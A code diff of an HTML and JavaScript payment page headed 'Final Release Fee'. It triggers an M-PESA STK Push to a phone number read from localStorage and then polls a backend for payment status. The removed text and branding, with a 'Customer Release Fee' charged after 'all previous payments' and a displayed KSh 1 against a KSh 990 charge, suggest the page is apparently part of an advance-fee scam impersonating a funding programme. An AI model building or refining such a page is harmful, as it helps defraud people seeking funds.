@@ -4,18 +4,12 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#087F32">
-<title>NYOTA Funds - Final Release Fee</title>
+<title>Final Release Fee</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Inter,sans-serif;
-}
-
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif;}
 body{
 background:#eef4fb;
 display:flex;
@@ -24,29 +18,19 @@ align-items:center;
 min-height:100vh;
 padding:18px;
 }
-
-.container{
-width:100%;
-max-width:420px;
-}
-
+.container{width:100%;max-width:420px;}
 .card{
 background:white;
 border-radius:28px;
 overflow:hidden;
 box-shadow:0 20px 55px rgba(0,0,0,.12);
 }
-
-/* Header */
-
 .header{
 background:linear-gradient(160deg,#087F32,#2563EB);
 padding:24px 22px 70px;
 text-align:center;
 color:white;
-position:relative;
 }
-
 .tag{
 display:inline-block;
 padding:6px 14px;
@@ -55,20 +39,8 @@ background:rgba(255,255,255,.18);
 font-size:12px;
 margin-bottom:12px;
 }
-
-.header h1{
-font-size:28px;
-font-weight:800;
-}
-
-.header p{
-margin-top:6px;
-opacity:.9;
-font-size:14px;
-}
-
-/* Floating amount card */
-
+.header h1{font-size:28px;font-weight:800;}
+.header p{margin-top:6px;opacity:.9;font-size:14px;}
 .release-card{
 width:calc(100% - 36px);
 margin:-40px auto 18px;
@@ -77,29 +49,19 @@ border-radius:22px;
 padding:20px;
 box-shadow:0 12px 30px rgba(37,99,235,.15);
 text-align:center;
-position:relative;
-z-index:2;
 }
-
 .release-card small{
-color:#64748B;
-font-size:12px;
 display:block;
+font-size:12px;
+color:#64748B;
 margin-bottom:6px;
 }
-
 .release-card h2{
 font-size:34px;
 color:#087F32;
 font-weight:800;
 }
-
-.content{
-padding:0 18px 22px;
-}
-
-/* Success notice */
-
+.content{padding:0 18px 22px;}
 .notice{
 background:#ECFDF5;
 border:1px solid #BBF7D0;
@@ -110,15 +72,11 @@ font-size:14px;
 line-height:1.6;
 margin-bottom:18px;
 }
-
-/* Detail tiles */
-
 .details{
 display:grid;
 gap:12px;
 margin-bottom:20px;
 }
-
 .tile{
 background:#F8FAFC;
 border:1px solid #E5E7EB;
@@ -128,7 +86,6 @@ display:flex;
 align-items:center;
 gap:12px;
 }
-
 .tile-icon{
 width:42px;
 height:42px;
@@ -139,20 +96,15 @@ justify-content:center;
 align-items:center;
 font-size:18px;
 }
-
 .tile-text small{
 display:block;
 color:#64748B;
 font-size:12px;
 }
-
 .tile-text strong{
 font-size:14px;
 color:#0F172A;
 }
-
-/* Button */
-
 button{
 width:100%;
 padding:19px;
@@ -163,41 +115,11 @@ color:white;
 font-size:18px;
 font-weight:700;
 cursor:pointer;
-transition:.25s;
 box-shadow:0 14px 35px rgba(22,163,74,.35);
-position:relative;
-overflow:hidden;
+transition:.25s;
 }
-
-button::after{
-content:"";
-position:absolute;
-top:0;
-left:-100%;
-width:100%;
-height:100%;
-background:linear-gradient(120deg,
-transparent,
-rgba(255,255,255,.35),
-transparent);
-transition:.7s;
-}
-
-button:hover{
-transform:translateY(-2px);
-}
-
-button:hover::after{
-left:100%;
-}
-
-button:disabled{
-opacity:.6;
-cursor:not-allowed;
-}
-
-/* Status */
-
+button:hover{transform:translateY(-2px);}
+button:disabled{opacity:.6;cursor:not-allowed;}
 #status{
 margin-top:14px;
 text-align:center;
@@ -206,19 +128,8 @@ min-height:22px;
 padding:8px;
 border-radius:10px;
 }
-
-.success{
-background:#ECFDF5;
-color:#15803D;
-}
-
-.error{
-background:#FEF2F2;
-color:#DC2626;
-}
-
-/* Security strip */
-
+.success{background:#ECFDF5;color:#15803D;}
+.error{background:#FEF2F2;color:#DC2626;}
 .security{
 margin-top:20px;
 padding-top:18px;
@@ -236,109 +147,79 @@ gap:8px;
 <body>
 
 <div class="container">
-
 <div class="card">
 
 <div class="header">
-
-<div class="tag">FINAL VERIFICATION</div>
-
-<h1>NYOTA Funds</h1>
-
-<p>Complete your final payment</p>
-
+<div class="tag">FINAL PAYMENT</div>
+<h1>Final Release</h1>
+<p>Complete your payment via M-PESA STK Push</p>
 </div>
 
 <div class="release-card">
-
-<small>Customer Release Fee</small>
-
-<h2>KSh 1</h2>
-
+<small>Release Fee</small>
+<h2>KSh 990</h2>
 </div>
 
 <div class="content">
 
 <div class="notice">
-Congratulations! You have completed all previous payments. The final step is to pay the **Customer Release Fee of KSh 990**. Once this payment is confirmed, your application will proceed to completion
+An M-PESA STK Push will be sent to your saved phone number. Once payment is confirmed, you'll be redirected automatically.
 </div>
 
 <div class="details">
 
 <div class="tile">
-
 <div class="tile-icon">👤</div>
-
 <div class="tile-text">
-
-<small>Applicant</small>
-
-<strong id="name">Applicant</strong>
-
+<small>Customer</small>
+<strong id="name">Customer</strong>
 </div>
-
 </div>
 
 <div class="tile">
-
 <div class="tile-icon">📱</div>
-
 <div class="tile-text">
-
 <small>Phone Number</small>
-
 <strong id="phone">Not available</strong>
-
+</div>
 </div>
 
 </div>
 
-</div>
-
-<button id="payBtn" onclick="payService()">
-
-Pay KSh 1 →
-
-</button>
+<button id="payBtn">Pay KSh 990 →</button>
 
 <div id="status"></div>
 
 <div class="security">
-
 <span>🔒 SSL Secure</span>
-
 <span>⚡ M-PESA STK Push</span>
-
 <span>✔ Protected</span>
-
 </div>
 
 </div>
-
 </div>
-
 </div>
 
 <script>
 "use strict";
 
-const BACKEND="https://nyota-program-backend.onrender.com";
+const BACKEND="https://nyota-program-001-functionality-1.onrender.com";
 const FEE=990;
 
 const button=document.getElementById("payBtn");
 const statusBox=document.getElementById("status");
 
-const applicant=
+const customer=
 localStorage.getItem("fullName")||
 localStorage.getItem("fullname")||
-"Applicant";
+"Customer";
 
 const phone=
 localStorage.getItem("phoneNumber")||
 localStorage.getItem("phone")||
 "";
 
-document.getElementById("name").textContent=applicant;
+document.getElementById("name").textContent=customer;
 document.getElementById("phone").textContent=phone||"Not available";
 
 function setStatus(message,type=""){
@@ -369,7 +250,7 @@ setStatus("Sending payment request...");
 
 try{
 
-const response=await fetch(BACKEND+"/stk-push",{
+const response=await fetch(`${BACKEND}/stk-push`,{
 method:"POST",
 headers:{
 "Content-Type":"application/json"
@@ -426,7 +307,7 @@ return;
 
 try{
 
-const response=await fetch(BACKEND+"/payment-status",{
+const response=await fetch(`${BACKEND}/payment-status`,{
 method:"POST",
 headers:{
 "Content-Type":"application/json"
@@ -472,6 +353,8 @@ console.error(error);
 },3000);
 
 }
+
+button.addEventListener("click",payService);
 </script>
 
 </body>
